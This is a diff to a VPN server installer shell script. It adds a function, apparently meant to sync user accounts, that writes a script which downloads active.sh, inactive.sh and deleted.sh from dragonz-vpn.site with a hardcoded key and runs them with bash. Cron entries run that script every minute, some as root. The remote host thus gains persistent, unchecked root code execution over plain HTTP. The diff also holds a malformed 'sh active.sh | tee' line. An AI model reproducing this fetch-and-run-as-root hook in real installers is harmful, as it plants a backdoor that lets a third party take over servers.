@@ -697,6 +697,46 @@ echo "SHELL=/bin/bash
 0 * * * * /bin/bash /bin/dnsttauto.sh >/dev/null 2>&1" | crontab -
 }
 
+installing_api(){
+
+#API Details
+VPN_Owner='MTknetwork';
+API_LINK='dragonz-vpn.site/api/authentication/premium';
+API_KEY='Tknetwork';
+
+
+
+cat <<EOF >/home/authentication.sh
+#!/bin/bash
+SHELL=/bin/bash
+PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
+wget -O /home/active.sh "$API_LINK/active.php?key=$API_KEY"
+sleep 5
+wget -O /home/inactive.sh "$API_LINK/inactive.php?key=$API_KEY"
+sleep 5
+wget -O /home/deleted.sh "$API_LINK/deleted.php?key=$API_KEY"
+sleep 15
+bash /home/active.sh
+sleep 15
+bash /home/inactive.sh
+sleep 15
+bash /home/deleted.sh
+EOF
+
+echo -e "* *\t* * *\troot\tsudo bash /home/authentication.sh" >> "/etc/cron.d/account"
+
+echo "* * * * * /bin/bash  /home/active.sh >/dev/null 2>&1" | crontab -
+
+echo "* * * * * /bin/bash  /home/authentication.sh >/dev/null 2>&1" | crontab -
+
+sh active.sh | tee -a  /home/active.sh
+
+wget -O /home/active.sh "dragonz-vpn.site/api/authentication/premium/active.php?key=Tknetwork"
+sleep 5
+wget -O /home/inactive.sh "dragonz-vpn.site/api/authentication/premium/inactive.php?key=Tknetwork"
+sleep 5
+wget -O /home/deleted.sh "dragonz-vpn.site/api/authentication/premium/deleted.php?key=Tknetwork"
+}
 
 
 display_menu () {
@@ -983,6 +1023,7 @@ chmod +x /usr/local/sbin/*
 
 
 startinstall
+installing_api
 controls
 clear
 display_menu
